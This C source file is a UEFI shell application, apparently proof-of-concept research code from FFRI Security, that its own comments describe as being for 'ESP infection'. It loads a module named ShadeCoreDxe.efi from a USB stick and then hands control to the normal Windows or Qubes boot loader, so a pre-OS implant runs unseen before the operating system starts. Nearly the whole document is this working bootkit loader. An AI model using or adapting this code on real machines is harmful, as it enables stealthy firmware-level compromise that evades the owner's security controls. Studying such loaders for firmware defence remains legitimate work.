/*
 * (c) FFRI Security, Inc., 2026 / Author: FFRI Security, Inc.
 */

// 
// This UEFI app is for ESP infection
//  - Place ShadeCoreDxe.efi on USB stick and use this app on UEFI shell
//

#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/DevicePathLib.h>
#include <Library/PrintLib.h>
#include <Library/BaseLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Protocol/ServiceBinding.h>



EFI_HANDLE
EFIAPI
GetHandleFromFilePath (
    IN  CHAR16  *CheckFileName
  )
{
  EFI_STATUS Status;

  EFI_HANDLE *SimpleFsHandles = NULL;
  UINTN SimpleFsHandlesCount = 0;
  Status = gBS->LocateHandleBuffer(
      ByProtocol,
      &gEfiSimpleFileSystemProtocolGuid,
      NULL,
      &SimpleFsHandlesCount,
      &SimpleFsHandles
      );
  Print(L"LocateHandleBuf(SimpleFS) %r\n", Status);

  for(UINTN i=0; i<SimpleFsHandlesCount; i++) {
    EFI_SIMPLE_FILE_SYSTEM_PROTOCOL *fs = NULL;

    gBS->HandleProtocol(
        SimpleFsHandles[i],
        &gEfiSimpleFileSystemProtocolGuid,
        (VOID**)&fs
        );

    EFI_FILE_PROTOCOL* FileProtocol = NULL;
    fs->OpenVolume(
        fs,
        &FileProtocol
        );

    EFI_FILE_PROTOCOL* f = NULL;
    Status = FileProtocol->Open(
        FileProtocol,
        &f,
        CheckFileName,
        EFI_FILE_MODE_READ,
        0
        );
    if(Status == EFI_SUCCESS) {
      // target fs found
      f->Close(f);
      f = NULL;
      return SimpleFsHandles[i];
    }
  }
  return NULL;
}



EFI_STATUS
EFIAPI
ExecModule(
    IN  EFI_HANDLE  *DevHandle,
    IN  CHAR16      *FilePath
  )
{
  EFI_STATUS Status;
  EFI_DEVICE_PATH_PROTOCOL *fdp = FileDevicePath(DevHandle, FilePath);
  CHAR16 *dpt = NULL;
  dpt = ConvertDevicePathToText(
      fdp,
      FALSE,
      FALSE
      );
  Print(L"Loading %s\n", dpt);

  EFI_HANDLE ImgHandle;
  Status = gBS->LoadImage (
      FALSE,
      gImageHandle,
      fdp,    // NULL,
      NULL,   // RawFileContent,
      0,      // FileSize,
      &ImgHandle
      );
  Print(L"LoadImage %s %r\n", FilePath, Status);

  Status = gBS->StartImage(
      ImgHandle,
      NULL,
      NULL
      );
  Print(L"StartImage %s %r\n", FilePath, Status);

  return Status;
}



EFI_STATUS
EFIAPI
UefiMain (
    IN EFI_HANDLE        ImageHandle,
    IN EFI_SYSTEM_TABLE *SystemTable
    )
{
  gImageHandle = ImageHandle;
  Print(L"Shade BIOS Loader Entry\n");

  // 1: Load ShadeCoreDxe
  Print(L"[Loader] Executing ShadeCoreDxe\n");
  EFI_HANDLE UsbHandle = GetHandleFromFilePath(L"EFILOAD");
  ExecModule(
      UsbHandle,
      L"ShadeCoreDxe.efi"
      );
  /*
   *EFI_HANDLE EspHandle = GetHandleFromFilePath(L"EFI\\Microsoft");
   *if(EspHandle!=NULL) {
   *  ExecModule(
   *      EspHandle,
   *      L"ShadeCoreDxe.efi"
   *      );
   *}
   */

  // 2: Load original bootmgfw.efi
  Print(L"[Loader] Executing bootmgfw.efi\n");
  EFI_HANDLE EspHandle = GetHandleFromFilePath(L"EFI\\Microsoft");
  if(EspHandle!=NULL) {
    ExecModule(
        EspHandle,
        L"EFI\\BOOT\\bootx64.efi"
        );
    return EFI_SUCCESS;
  }

  // 3: Load grubx64.efi for Qubes OS if not Windows
  Print(L"[Loader] Executing grubx64.efi\n");
  EspHandle = GetHandleFromFilePath(L"EFI\\qubes");
  if(EspHandle!=NULL) {
    ExecModule(
        EspHandle,
        L"EFI\\qubes\\grubx64.efi"
        );
    return EFI_SUCCESS;
  }

  return EFI_NOT_FOUND;
}
